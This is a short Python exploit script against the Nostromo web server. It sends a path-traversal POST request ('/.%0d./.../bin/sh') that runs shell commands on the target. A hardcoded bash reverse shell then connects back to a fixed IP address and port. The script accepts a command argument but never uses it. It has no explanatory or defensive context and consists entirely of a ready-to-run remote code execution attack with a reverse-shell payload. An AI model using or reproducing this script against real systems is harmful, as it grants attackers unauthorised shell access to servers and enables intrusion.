import socket
import argparse

parser = argparse.ArgumentParser(description='Nostromo Remote Code execution')
parser.add_argument('host',help='domain/IP of the Nostromo web server')
parser.add_argument('port',help='port number',type=int)
parser.add_argument('cmd',help='command to execute, default is id',default='id',nargs='?')
args = parser.parse_args()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
payload += "Content-Length: 1\r\n\r\necho\necho\n"
payload += "/bin/bash -i >& /dev/tcp/10.8.6.24/8800 0>&1 2>&1"

print ("[+] Connecting to target")
s.connect((args.host , int(args.port)))

print("[+] Sending malicious payload")
s.sendall(payload.encode('utf-8') )

data = []

while True:
    chunk = s.recv(1024)
    if chunk: data.append(chunk.decode("utf-8"))
    else: break  

print("".join(data))
